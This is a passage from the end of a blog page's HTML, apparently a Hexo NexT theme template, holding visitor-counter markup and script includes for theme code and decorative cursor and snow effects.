      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


  <script async src="/js/cursor/fireworks.js"></script>


</body>
</html>
<!-- 引入jQuery -->
<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
<!-- 雪花特效2 -->
<script type="text/javascript" src="/js/snow2.js"></script>

<!-- 樱花特效 -->
  
      <script async src="/js/fairyDustCursor.js"></script>
  


